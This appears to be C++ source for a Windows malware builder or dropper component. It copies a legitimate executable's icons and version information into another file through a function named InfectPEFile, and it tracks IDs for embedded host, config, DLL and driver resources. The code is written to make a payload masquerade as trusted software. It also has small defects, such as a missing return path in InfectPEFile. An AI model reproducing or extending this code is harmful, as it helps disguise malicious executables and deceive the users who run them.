#include "ResourceManager.h"

bool ResourceManager::set_resource(ULONG resource_id, PBYTE data, size_t size, TCHAR *type, TCHAR *filepath) {
	HANDLE hUpdateResc = BeginUpdateResource(filepath, false);
	if (!UpdateResource(hUpdateResc, type, MAKEINTRESOURCE(resource_id), 0, data, size))
		return false;
	if (!EndUpdateResource(hUpdateResc, false))
		return false;
	return true;
}

bool ResourceManager::get_resource(ULONG resource_id, BinaryData &buffer, TCHAR *type, TCHAR *filepath) {
	HMODULE hModule = NULL;
	if (filepath)
		hModule = LoadLibraryEx(filepath, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
	if (!hModule)
		return false;
	HRSRC hRsrc = FindResource(hModule, MAKEINTRESOURCE(resource_id), type);
	HGLOBAL hResource = LoadResource(hModule, hRsrc);
	if (!hResource)
		return false;
	char *p = (char*)LockResource(hResource);
	DWORD size = SizeofResource(hModule, hRsrc);
	buffer.SetData(p, size);
	FreeResource(hResource);
	FreeLibrary(hModule);
	return true;
}

ResourceManager::ResourceManager() {
	if (!GetTempPath(MAX_PATH, TempPath))
		lstrcpy(TempPath, TEXT("C:\\Windows\\Temp\\"));
}

void ResourceManager::SetResourceId(ULONG exeFileHost, ULONG configResc, ULONG exeIcon, size_t ndllResc, PULONG dllResc, size_t nsysResc, PULONG sysResc) {
	ExeFileHost = exeFileHost;
	ExeIcon = exeIcon;
	ConfigResc = configResc;
	memcpy_s(DllResc, sizeof(DllResc), dllResc, sizeof(ULONG)*ndllResc);
	nDllResc = ndllResc;
	memcpy_s(SysResc, sizeof(SysResc), sysResc, sizeof(ULONG)*nsysResc);
	nSysResc = nsysResc;
}

bool ResourceManager::GetResource(ULONG resId, BinaryData &bin, TCHAR *type, TCHAR *path) {
	return get_resource(resId, bin, type, path);
}

bool ResourceManager::SetResource(ULONG resId, PBYTE pRes, size_t size, TCHAR *type, TCHAR *path) {
	return set_resource(resId, pRes, size, type, path);
}

ULONG ResourceManager::GetConfigId() {
	return ConfigResc;
}

ULONG ResourceManager::GetSysId(size_t n) {
	if (n < nSysResc)
		return SysResc[n];
	else
		return 0;
}

ULONG ResourceManager::GetDllId(size_t n) {
	if (n < nDllResc)
		return DllResc[n];
	else
		return 0;
}

bool ResourceManager::ChangePEIcon(LPCTSTR strSource, LPCTSTR strDest) {
#define __FLIP(x) ((x >> 24) | (((x >> 16) & 0xFF) << 8) | (((x >> 8) & 0xFF) << 16) | ((x & 0xFF) << 24))
#pragma pack(push, 1)
	struct ICONIMAGE {
		BITMAPINFOHEADER   icHeader;   // DIB header
		RGBQUAD         icColors[1];   // Color table
		BYTE            icXOR[1];      // DIB bits for XOR mask
		BYTE            icAND[1];      // DIB bits for AND mask
	};
	struct GRPICONDIRENTRY {
		BYTE   bWidth;               // Width, in pixels, of the image
		BYTE   bHeight;              // Height, in pixels, of the image
		BYTE   bColorCount;          // Number of colors in image (0 if >=8bpp)
		BYTE   bReserved;            // Reserved
		WORD   wPlanes;              // Color Planes
		WORD   wBitCount;            // Bits per pixel
		DWORD   dwBytesInRes;         // how many bytes in this resource?
		WORD   nID;                  // the ID
	};
	struct GRPICONDIR {
		WORD            idReserved;   // Reserved (must be 0)
		WORD            idType;       // Resource type (1 for icons)
		WORD            idCount;      // How many images?
		GRPICONDIRENTRY   idEntries[1]; // The entries for each image
	};
	struct PNGHEADER {
		unsigned marker : 8;
		unsigned magic : 24;
		unsigned crlf : 16;
		unsigned stop : 8;
		unsigned lf : 8;
	};
	struct PNGCHUNK {
		DWORD length;
		DWORD type;
	};
	struct IHDR : public PNGCHUNK {
		DWORD width;
		DWORD height;
		BYTE biDepth;
		BYTE colorType;
		BYTE compression;
		BYTE filter;
		BYTE interlace;
	};
#pragma pack(pop)
	HMODULE hModule = LoadLibraryEx(strSource, nullptr, LOAD_LIBRARY_AS_DATAFILE);
	if (!hModule)
		return false;
	//determine the first-mentioned icon in the exe file
	PTCHAR firstIcon = nullptr;
	EnumResourceNames(hModule, RT_GROUP_ICON, [](HMODULE hmod, LPCTSTR lpType, LPTSTR lpName, LONG_PTR lParam)->BOOL {
		*(LPCTSTR*)lParam = IS_INTRESOURCE(lpName) ? lpName : _tcsdup(lpName);
		return false;
	}, (LONG_PTR)&firstIcon);
	GRPICONDIR *pIconGroup;
	HRSRC hResource = FindResource(hModule, firstIcon, RT_GROUP_ICON);
	HGLOBAL hGlobal = LoadResource(hModule, hResource);
	pIconGroup = (GRPICONDIR*)LockResource(hGlobal);
	if (!pIconGroup)
		return false;
	// Validate the icon structure:
	if (pIconGroup->idReserved || pIconGroup->idType != 1)
		return false;
	HANDLE hUpdate = BeginUpdateResource(strDest, false);
	if (!hUpdate)
		return false;
	bool ret = UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), 0, pIconGroup, SizeofResource(hModule, hResource));
	size_t iClosest = 0;
	size_t bestWidth = 0;
	size_t bestBitDepth = 0;
	size_t bestId;
	ICONIMAGE *pBestIcon = nullptr;
	GRPICONDIRENTRY *pBestEntry = nullptr;
	HRSRC bestInfo = nullptr;
	for (int i = pIconGroup->idCount; i--;) {
		// Now load the descendant resource:
		HRSRC hTargetIcon = FindResource(hModule, MAKEINTRESOURCE(pIconGroup->idEntries[i].nID), RT_ICON);
		HGLOBAL hGlobal = LoadResource(hModule, hTargetIcon);
		ICONIMAGE* pIcon = (ICONIMAGE*)LockResource(hGlobal);
		if (!pIcon) {
			ret = false;
			break;
		}
		size_t curWidth;
		if (pIconGroup->idEntries[i].bWidth)
			curWidth = pIcon->icHeader.biWidth;
		else {
			// PNG image, process the header:
			PNGHEADER& hdr = *(PNGHEADER*)pIcon;
			if (hdr.marker != 0x89 || hdr.magic != 'GNP' || hdr.crlf != '\r\n' || hdr.stop != 0x1A || hdr.lf != '\n') {
				ret = false;
				break;
			}

			// Try to find the IHDR chunk:
			auto pngChunk = (PNGCHUNK*)(&hdr + 1);
			if (pngChunk->type != 'RDHI') {
				ret = false;
				break;
			}
			// Extract width
			IHDR* pIhdr = (IHDR*)pngChunk;
			curWidth = __FLIP(pIhdr->width);
		}
		int width = 256;
		if (// True if this isn't an improvement
			abs((long long)curWidth - (long long)width) > abs((long long)bestWidth - (long long)width) ||
			// True if this isn't bigger, but doesn't have a better bit depth
			curWidth == bestWidth &&
			pIcon->icHeader.biBitCount < bestBitDepth)
			continue;

		pBestIcon = pIcon;
		pBestEntry = &pIconGroup->idEntries[i];
		bestId = pIconGroup->idEntries[i].nID;
		bestWidth = curWidth;
		bestInfo = hTargetIcon;
		bestBitDepth = pIcon->icHeader.biBitCount;
	}
	for (int i = 1; i <= pIconGroup->idCount; ++i)
		UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(i), 0, pBestIcon, SizeofResource(hModule, bestInfo));
	if (ret)
		return EndUpdateResource(hUpdate, false);
	EndUpdateResource(hUpdate, true);
	return ret;
}

bool ResourceManager::ChangePEVersionInfo(TCHAR *src, TCHAR *dst) {
	BinaryData bin;
	if (get_resource(1, bin, RT_VERSION, src))
		return set_resource(1, (PBYTE)bin.GetData(), bin.GetSize(), RT_VERSION, dst);
	return false;
}

bool ResourceManager::InfectPEFile(TCHAR *host, TCHAR *dst, size_t mode) {
	if (mode == 0) {
		if (!ChangePEIcon(host, dst))
			return false;
		if (!ChangePEVersionInfo(host, dst))
			return false;
		return true;
	}
}